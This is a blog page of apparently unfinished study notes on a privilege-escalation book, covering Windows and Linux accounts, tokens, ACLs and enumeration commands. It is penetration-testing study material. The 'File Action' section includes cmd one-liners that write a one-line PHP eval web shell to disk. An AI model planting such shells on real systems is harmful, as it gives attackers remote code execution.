@@ -1,0 +1,367 @@
+<!DOCTYPE html><html lang="en-us" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>[Book] Privilege Escalation - Offensive and Defensive Tactics and Techniques | iss4cf0ng/ISSAC's blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":true,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.6.1/MathJax.js"></script><script>MathJax.Hub.Config({
+ menuSettings: {
+   zoom: "None"
+ },
+ showMathMenu: false,
+ jax: ["input/TeX","output/CommonHTML"],
+ extensions: ["tex2jax.js"],
+ TeX: {
+   extensions: ["AMSmath.js","AMSsymbols.js"],
+   equationNumbers: {
+     autoNumber: "AMS"
+   }
+ },
+ tex2jax: {
+   inlineMath: [["\\(", "\\)"]],
+   displayMath: [["\\[", "\\]"]]
+ }
+});</script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Brands';
+ src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Free';
+ src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
+  --light-background: url('/img/bk.jpg');
+}</style><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="iss4cf0ng/ISSAC's blog" type="application/atom+xml">
+</head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/About/"><span class="navItemTitle">About</span></a></li><li class="navItem"><a class="navBlock" href="/Alien/"><span class="navItemTitle">Alien</span></a></li><li class="navItem"><a class="navBlock" href="/2026/01/28/2026-1-28-ToolsDuplexSpy-v2-0-0/"><span class="navItemTitle">DuplexSpy</span></a></li><li class="navItem"><a class="navBlock" href="/Notes/"><span class="navItemTitle">Notes</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[Book] Privilege Escalation - Offensive and Defensive Tactics and Techniques</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2026-01-02T15:36:14.000Z" id="date"> 2026-01-02</time></div></span><br><span>Last Update: <div class="control"><time datetime="2026-01-11T07:38:53.389Z" id="updated"> 2026-01-11</time></div></span><br><span>Word Count: <div class="control">1.7k</div></span><br><span>Read Time: <div class="control">10 min</div></span></div></div><hr><div id="post-content"><h1 id="El-libro"><a href="#El-libro" class="headerlink" title="El libro"></a>El libro</h1><p align="center" class='item-img' data-src='/images/books/PrivilegeEscalation/libro.png'><img src="/images/books/PrivilegeEscalation/libro.png" width="500">
+</p>
+
+<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article is used to keep notes and summaries of the book “Privilege Escalation - Offensive and Defensive Tactics and Techniques”.<br>The content will be continuously updated as I read through the book.</p>
+<h1 id="Reflection"><a href="#Reflection" class="headerlink" title="Reflection"></a>Reflection</h1><h1 id="Chapter-1-Fundamentals"><a href="#Chapter-1-Fundamentals" class="headerlink" title="Chapter.1 - Fundamentals"></a>Chapter.1 - Fundamentals</h1><h2 id="1-2-Windows-Privilege-Escalation"><a href="#1-2-Windows-Privilege-Escalation" class="headerlink" title="1.2 - Windows Privilege Escalation"></a>1.2 - Windows Privilege Escalation</h2><h3 id="Local-User-And-Local-Group"><a href="#Local-User-And-Local-Group" class="headerlink" title="Local User And Local Group"></a>Local User And Local Group</h3><p>cmd:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; net user<br><br>User accounts for \\DESKTOP-NKNBEK2<br><br>-------------------------------------------------------------------------------<br>Administrator            DefaultAccount           Guest<br>sdksdk                   WDAGUtilityAccount<br>The command completed successfully.<br></code></pre></td></tr></table></figure></p>
+<p>PowerShell<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">PS &gt; Get-LocalUser<br><br>Name               Enabled Description<br>----               ------- -----------<br>Administrator      False   Built-in account for administering the computer/domain<br>DefaultAccount     False   A user account managed by the system.<br>Guest              False   Built-in account for guest access to the computer/domain<br>sdksdk             True<br>WDAGUtilityAccount False   A user account managed and used by the system for Windows Defender Application Guard scen...<br></code></pre></td></tr></table></figure></p>
+<p>lusrmgr.msc</p>
+<hr>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; net user &lt;Username&gt; &lt;Password&gt; /add<br>&gt; net user &lt;Username&gt; /del<br></code></pre></td></tr></table></figure>
+<hr>
+<p>Local Group<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; net localgroup<br><br>Aliases for \\DESKTOP-NKNBEK2<br><br>-------------------------------------------------------------------------------<br>*Access Control Assistance Operators<br>*Administrators<br>*Backup Operators<br>*Cryptographic Operators<br>*Device Owners<br>*Distributed COM Users<br>*Event Log Readers<br>*Guests<br>*Hyper-V Administrators<br>*IIS_IUSRS<br>*Network Configuration Operators<br>*Performance Log Users<br>*Performance Monitor Users<br>*Power Users<br>*Remote Desktop Users<br>*Remote Management Users<br>*Replicator<br>*System Managed Accounts Group<br>*Users<br>The command completed successfully.<br></code></pre></td></tr></table></figure><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; Get-LocalGroup<br><br>Name                                Description<br>----                                -----------<br>Access Control Assistance Operators Members of this group can remotely query authorization attributes and permission...<br>Administrators                      Administrators have complete and unrestricted access to the computer/domain<br>Backup Operators                    Backup Operators can override security restrictions for the sole purpose of back...<br>Cryptographic Operators             Members are authorized to perform cryptographic operations.<br>Device Owners                       Members of this group can change system-wide settings.<br>Distributed COM Users               Members are allowed to launch, activate and use Distributed COM objects on this ...<br>Event Log Readers                   Members of this group can read event logs from local machine<br>Guests                              Guests have the same access as members of the Users group by default, except for...<br>Hyper-V Administrators              Members of this group have complete and unrestricted access to all features of H...<br>IIS_IUSRS                           Built-in group used by Internet Information Services.<br>Network Configuration Operators     Members in this group can have some administrative privileges to manage configur...<br>Performance Log Users               Members of this group may schedule logging of performance counters, enable trace...<br>Performance Monitor Users           Members of this group can access performance counter data locally and remotely<br>Power Users                         Power Users are included for backwards compatibility and possess limited adminis...<br>Remote Desktop Users                Members in this group are granted the right to logon remotely<br>Remote Management Users             Members of this group can access WMI resources over management protocols (such a...<br>Replicator                          Supports file replication in a domain<br>System Managed Accounts Group       Members of this group are managed by the system.<br>Users                               Users are prevented from making accidental or intentional system-wide changes an...<br></code></pre></td></tr></table></figure></p>
+<p>Useful group during penetration testing:</p>
+<ul>
+<li>Administrators</li>
+<li>Power Users</li>
+<li>Users</li>
+<li>Guests</li>
+<li>TrustedInstaller</li>
+<li>Authenticated Users</li>
+</ul>
+<p>Built-in Account</p>
+<ul>
+<li>Local System:<br>This account has the greatest power before Windows XP, it is able to modify file system, registry, task, Windows Installer, Windows Update, etc. However, Microsoft separated it, nowadays, the account with greatest pwoer is <strong>TrustedInstaller</strong>.</li>
+<li>Local Service</li>
+<li>Network Service</li>
+</ul>
+<p>Useful Command:<br>| cmd | PowerShell | Description |<br>| —- | —- | —- |<br>| net user | Get-LocalUser | View local users. |<br>| net localgroup | Get-LocalGroup | View local groups. |<br>| net user <User> | Get-LocalGroup -Name <User> | Select-Object * | View user’s properties. |<br>| net localgroup <Group Name> | Get-LocalGroupMember <Group Name> | View users in the group. |<br>| net user <User> <Password> /add | $password=Read-Host -AsSecureString New-LocalUser “username” -Password $password | Add new user. |<br>| net localgroup <Group> <User> /add | Add-LocalGroupMember - Group ‘<Group Name>‘ -Member (‘<User>‘) | Add user into the group. |<br>| net user <User> /del | Remove-LocalUser -Name <User> | Delete user. |<br>| net user <User> <New Password> | $password=Read-Host -AsSecureString Set-LocalUser -Name <User> -Password $password | Change user’s password |</p>
+<h3 id="ACL-Access-Control-List"><a href="#ACL-Access-Control-List" class="headerlink" title="ACL (Access Control List)"></a>ACL (Access Control List)</h3><div class="table-container">
+<table>
+<thead>
+<tr>
+<th>Term</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Security Descriptor</td>
+<td>Describe the information of Security Object, like SID, DACL, SACL, etc.</td>
+</tr>
+<tr>
+<td>Security Object</td>
+<td>Object with Security Descriptor, like file, directory, registry, process, thread, pipe, etc.</td>
+</tr>
+<tr>
+<td>ACL</td>
+<td>Access Control List</td>
+</tr>
+<tr>
+<td>ACE</td>
+<td>Access Control Entries</td>
+</tr>
+<tr>
+<td>DACL</td>
+<td>Discretionary Access Control List</td>
+</tr>
+<tr>
+<td>SACL</td>
+<td>System Access Control List</td>
+</tr>
+<tr>
+<td>trustees</td>
+<td>Account, group, login session, etc.</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="Security-Descriptor"><a href="#Security-Descriptor" class="headerlink" title="Security Descriptor"></a>Security Descriptor</h3><ol>
+<li>View SID of current user:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; whoami /user<br></code></pre></td></tr></table></figure></li>
+<li><p>View SID of all users:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; wmic useraccount get name,sid<br></code></pre></td></tr></table></figure>
+<p> S-R-X-Y1-Y2-Yn-1-Yn:</p>
+<ul>
+<li>S: Indicates that the string is a <strong>Security Identifier(SID)</strong>.</li>
+<li>R: Indicates the <strong>revision level</strong>.</li>
+<li>X: Indicates the identifier authority value.</li>
+<li><p>Y: Represents a series of subauthority values, where n is the number of values.</p>
+<ul>
+<li>The first part of the series(-Y1-Y2-Yn-1) is the domain identifier. This element of the SID becomes significant in an enterprise with several domains. No two domains in an enterprise share the same domain identifier.</li>
+<li>The last item in the series of subauthority values(-Yn) is the <strong>RID</strong>. It distinguishes one account or group from all other accounts and groups in the domain. <strong>Now two accounts or groups in any domain share the same RID</strong>.</li>
+</ul>
+</li>
+<li><p>Everyone: S-1-1-0</p>
+</li>
+<li>BUILTIN\Administrators: S-1-5-32-544, built-in adminsitrator group.</li>
+<li>BUILTIN\Users: S-1-5-32-545, built-in user group.</li>
+<li>NTAUTHORITY\INTERACTIVE: S-1-5-4, group of users which login whith interactive.</li>
+<li>NTAUTHORITY\AuthenticatedUsers: S-1-5-11, authenticated users.</li>
+<li>LocalService: S-1-5-19</li>
+<li>NetworkService: S-1-5-20</li>
+<li>LocalSystem: S-1-5-18</li>
+</ul>
+</li>
+</ol>
+<h3 id="Authentication"><a href="#Authentication" class="headerlink" title="Authentication"></a>Authentication</h3><ul>
+<li>winlogon.exe</li>
+<li>lsass.exe</li>
+<li>SAM: Security Account Manager, /system32/config, HKEY_LOCAL_MACHINE</li>
+</ul>
+<h3 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h3><p>An access token is an object that represents the security context of a process or thread.</p>
+<p>A session is created after the user is successfully authenticated and logs in. The Windows system then determines the user’s SID and the SIDs of the groups to which the user belongs. Subsequently, the Local Security Authority (LSA) creates an access token for the user.</p>
+<p>An access token contains the user’s SID, group SIDs, session ID, privileges, the default DACL, the token type, and other attributes.</p>
+<p>The access token is assigned to <code>userinit.exe</code>, whose path is stored in the registry key <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</code>.</p>
+<p><code>userinit.exe</code> is responsible for initializing the user’s environment, such as executing logon scripts, establishing network connections, and launching startup applications. It then reads the value of Shell, which is <code>explorer.exe</code> by default, and launches it as the Windows graphical user interface.</p>
+<p>After that, all child processes and threads inherit the access token of their parent process—<code>explorer.exe</code>—unless a process explicitly specifies a different token. Initially, most processes share the same access token.</p>
+<p>Token has two types:</p>
+<ol>
+<li>Primary Token</li>
+<li>Impersonation Token</li>
+</ol>
+<h3 id="Separation-of-Privilege"><a href="#Separation-of-Privilege" class="headerlink" title="Separation of Privilege"></a>Separation of Privilege</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; whoami /priv<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; gpedit.msc<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">PS&gt; Enable-Privilege -Privilege SeBackupPrivilege<br></code></pre></td></tr></table></figure>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Function</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Enable-Privilege -Privilege &lt;Privilege’s name&gt;</td>
+<td>Enable privilege</td>
+</tr>
+<tr>
+<td>Disable-Privilege -Privilege &lt;Privilege’s name&gt;</td>
+<td>Disable privilege</td>
+</tr>
+<tr>
+<td>Add-Privilege -Privilege &lt;Privilege’s name&gt;</td>
+<td>Add privilege</td>
+</tr>
+<tr>
+<td>Remove-Privilege -Privilege &lt;Privilege’s name&gt;</td>
+<td>Remove privilege</td>
+</tr>
+<tr>
+<td>Get-Privilege -CurrentUser</td>
+<td>View privilege of current user</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="Windows-Hash"><a href="#Windows-Hash" class="headerlink" title="Windows Hash"></a>Windows Hash</h3><ol>
+<li>LM Hash</li>
+<li>NTLM Hash</li>
+</ol>
+<h3 id="UAC"><a href="#UAC" class="headerlink" title="UAC"></a>UAC</h3><p><strong>UAC (User Account Control)</strong></p>
+<h3 id="Windows-Service"><a href="#Windows-Service" class="headerlink" title="Windows Service"></a>Windows Service</h3><h3 id="Registry"><a href="#Registry" class="headerlink" title="Registry"></a>Registry</h3><p>Data type:</p>
+<ul>
+<li>REG_SZ</li>
+<li>REG_MULTI_SZ</li>
+<li>REG_BINARY</li>
+<li>REG_DWORD</li>
+</ul>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>Hive</th>
+<th>Abbreviation</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>HKEY_CLASSES_ROOT</td>
+<td>HKCR</td>
+<td>File associations and COM object registration.</td>
+</tr>
+<tr>
+<td>HKEY_CURRENT_USER</td>
+<td>HKCU</td>
+<td>Settings for the currently logged-in user.</td>
+</tr>
+<tr>
+<td>HKEY_LOCAL_MACHINE</td>
+<td>HKLM</td>
+<td>System-wide configuration for the entire machine.</td>
+</tr>
+<tr>
+<td>HKEY_USERS</td>
+<td>HKU</td>
+<td>All user registry hives currently loaded.</td>
+</tr>
+<tr>
+<td>HKEY_CURRENT_CONFIG</td>
+<td>HKCC</td>
+<td>Current hardware profile.</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h2 id="1-3-Linux-Privilege-Escalation"><a href="#1-3-Linux-Privilege-Escalation" class="headerlink" title="1.3 - Linux Privilege Escalation"></a>1.3 - Linux Privilege Escalation</h2><h3 id="User"><a href="#User" class="headerlink" title="User"></a>User</h3><ul>
+<li>Root User(Super User)</li>
+<li>Regular User</li>
+<li>System User</li>
+</ul>
+<h3 id="User-Group"><a href="#User-Group" class="headerlink" title="User Group"></a>User Group</h3><h3 id="User-Configuration-Files"><a href="#User-Configuration-Files" class="headerlink" title="User Configuration Files"></a>User Configuration Files</h3><div class="table-container">
+<table>
+<thead>
+<tr>
+<th>File</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>/etc/passwd</td>
+<td>Users and their properties (such as, name, uid, group id).</td>
+</tr>
+<tr>
+<td>/etc/shadow</td>
+<td>Users’ password and properties.</td>
+</tr>
+<tr>
+<td>/etc/group</td>
+<td>Groups and their properties.</td>
+</tr>
+<tr>
+<td>/etc/gshadow</td>
+<td>Groups’ and their properties.</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p align="center" class='item-img' data-src='/images/books/PrivilegeEscalation/etc_passwd.png'><img src="/images/books/PrivilegeEscalation/etc_passwd.png" width="800" alt="/etc/passwd">
+  <figcaption>
+    Source: https://infosecwriteups.com/what-is-etc-passwd-group-shadow-file-in-linux-bd7b28f353f3
+  </figcaption>
+</p>
+
+
+
+<p align="center" class='item-img' data-src='/images/books/PrivilegeEscalation/etc_shadow.png'><img src="/images/books/PrivilegeEscalation/etc_shadow.png" width="800" alt="/etc/shadow">
+  <figcaption>
+    Source: https://linuxopsys.com/etc-shadow-file-explained
+  </figcaption>
+</p>
+
+
+
+<p align="center" class='item-img' data-src='/images/books/PrivilegeEscalation/etc_group.png'><img src="/images/books/PrivilegeEscalation/etc_group.png" width="800" alt="/etc/group">
+  <figcaption>
+    Source: https://dpcvirtualtips.com/working-with-local-users-and-groups-on-rhel/
+  </figcaption>
+</p>
+
+
+<p align="center" class='item-img' data-src='/images/books/PrivilegeEscalation/etc_gshadow.png'><img src="/images/books/PrivilegeEscalation/etc_gshadow.png" width="800" alt="/etc/gshadow">
+  <figcaption>
+    Source: https://ashutoshlinuxnotes.blogspot.com/p/user-and-group-permission.html
+  </figcaption>
+</p>
+
+
+
+<h1 id="Chapter-2-Environment-Setting-up-and-Tools"><a href="#Chapter-2-Environment-Setting-up-and-Tools" class="headerlink" title="Chapter.2 - Environment Setting-up and Tools"></a>Chapter.2 - Environment Setting-up and Tools</h1><h2 id="2-2-Kali-Linux"><a href="#2-2-Kali-Linux" class="headerlink" title="2.2 - Kali Linux"></a>2.2 - Kali Linux</h2><h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; sudo msfconsole<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; sudo msfdb status<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; sudo msfdb init<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">msf&gt; db_status<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">msf&gt; search privilege escalation platform:windows type:exploit<br></code></pre></td></tr></table></figure>
+<h3 id="Cobalt-Strike"><a href="#Cobalt-Strike" class="headerlink" title="Cobalt Strike"></a>Cobalt Strike</h3><h3 id="Empire-4"><a href="#Empire-4" class="headerlink" title="Empire 4"></a>Empire 4</h3><h2 id="2-3-PowerShell"><a href="#2-3-PowerShell" class="headerlink" title="2.3 - PowerShell"></a>2.3 - PowerShell</h2><h2 id="2-4-WinPEAs"><a href="#2-4-WinPEAs" class="headerlink" title="2.4 - WinPEAs"></a>2.4 - WinPEAs</h2><h2 id="2-5-PowerUp-and-SharpUp"><a href="#2-5-PowerUp-and-SharpUp" class="headerlink" title="2.5 - PowerUp and SharpUp"></a>2.5 - PowerUp and SharpUp</h2><h2 id="2-6-Accesshk"><a href="#2-6-Accesshk" class="headerlink" title="2.6 - Accesshk"></a>2.6 - Accesshk</h2><h2 id="2-7-cacls-and-icacls"><a href="#2-7-cacls-and-icacls" class="headerlink" title="2.7 - cacls and icacls"></a>2.7 - cacls and icacls</h2><h1 id="Chapter-3-File-Action"><a href="#Chapter-3-File-Action" class="headerlink" title="Chapter.3 - File Action"></a>Chapter.3 - File Action</h1><h2 id="3-1-Windows"><a href="#3-1-Windows" class="headerlink" title="3.1 - Windows"></a>3.1 - Windows</h2><h3 id="Create-Write-File"><a href="#Create-Write-File" class="headerlink" title="Create/Write File"></a>Create/Write File</h3><ol>
+<li>cmd<ol>
+<li>Write file with <code>set</code>:  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">set /p=&lt;?php @eval($_POST[&#x27;hello&#x27;])?^&gt;&lt;nul&gt;c:\1.php<br></code></pre></td></tr></table></figure></li>
+<li>Write file with <code>echo</code>:  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">echo ^&lt;?php @eval($_POST[&#x27;hello&#x27;])?&gt;&gt;c:\2.php<br></code></pre></td></tr></table></figure></li>
+<li>Appending with <code>echo</code>:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">echp ok&gt;&gt;c:\2.php<br></code></pre></td></tr></table></figure></li>
+<li>Appending without new line:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">set /p=&quot;222&quot;&gt;&gt;c:\1.php<br></code></pre></td></tr></table></figure></li>
+<li>Overwrite:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">echo ok&gt;c:\2.php<br></code></pre></td></tr></table></figure></li>
+<li>Write file with <code>echo</code> without space:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">echo.^&lt;?php @eval($_POST[&#x27;hello&#x27;])?^&gt;&gt;c:\3.php<br>echo,^&lt;?php @eval($_POST[&#x27;hello&#x27;])?^&gt;&gt;c:\3.php<br></code></pre></td></tr></table></figure></li>
+<li>Create empty file:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">cd.&gt;12.txt<br>copy nul 12.txt<br>type nul&gt;12.txt<br>fsutil file createnew c:\12.txt 0<br></code></pre></td></tr></table></figure></li>
+<li>copy file<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">type 1.php &gt; ok.php<br>copy 1.php ok.php<br></code></pre></td></tr></table></figure></li>
+<li>move file<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">move c:\1.txt d:\<br></code></pre></td></tr></table></figure></li>
+</ol>
+</li>
+<li>PowerShell</li>
+</ol>
+<h3 id="Read-File"><a href="#Read-File" class="headerlink" title="Read File"></a>Read File</h3><h3 id="Download-File"><a href="#Download-File" class="headerlink" title="Download File"></a>Download File</h3><ol>
+<li>PowerShell</li>
+<li>PHP</li>
+<li>Python</li>
+<li>VBS</li>
+<li>bitsadmin</li>
+<li>certutil</li>
+</ol>
+<h3 id="Compress-Decompress-File"><a href="#Compress-Decompress-File" class="headerlink" title="Compress/Decompress File"></a>Compress/Decompress File</h3><ol>
+<li>makecab/expand</li>
+<li>WinRAR</li>
+<li>7-Zip</li>
+<li>BandiZip</li>
+<li>PowerShell</li>
+</ol>
+<h2 id="3-2-Linux"><a href="#3-2-Linux" class="headerlink" title="3.2 - Linux"></a>3.2 - Linux</h2><h1 id="Chapter-4-Windows-Information-Enumeration"><a href="#Chapter-4-Windows-Information-Enumeration" class="headerlink" title="Chapter.4 - Windows Information Enumeration"></a>Chapter.4 - Windows Information Enumeration</h1><h2 id="4-1-Server-Information-Enumeration"><a href="#4-1-Server-Information-Enumeration" class="headerlink" title="4.1 - Server Information Enumeration"></a>4.1 - Server Information Enumeration</h2><h3 id="System-Version"><a href="#System-Version" class="headerlink" title="System Version"></a>System Version</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; ver<br></code></pre></td></tr></table></figure>
+<h3 id="Architecture"><a href="#Architecture" class="headerlink" title="Architecture"></a>Architecture</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; wmic os get osarchitecture<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; echo %PROCESSOR_ARCHITECTURE%<br></code></pre></td></tr></table></figure>
+<h3 id="Service-Information"><a href="#Service-Information" class="headerlink" title="Service Information"></a>Service Information</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; sc query state=all<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; wmic service list brief<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">PS&gt; Get-WmiObject win32_service | select Name,PathName<br></code></pre></td></tr></table></figure>
+<h3 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; tasklist<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; tasklist /svc<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; wmic process list brief<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">PS&gt; ps<br></code></pre></td></tr></table></figure>
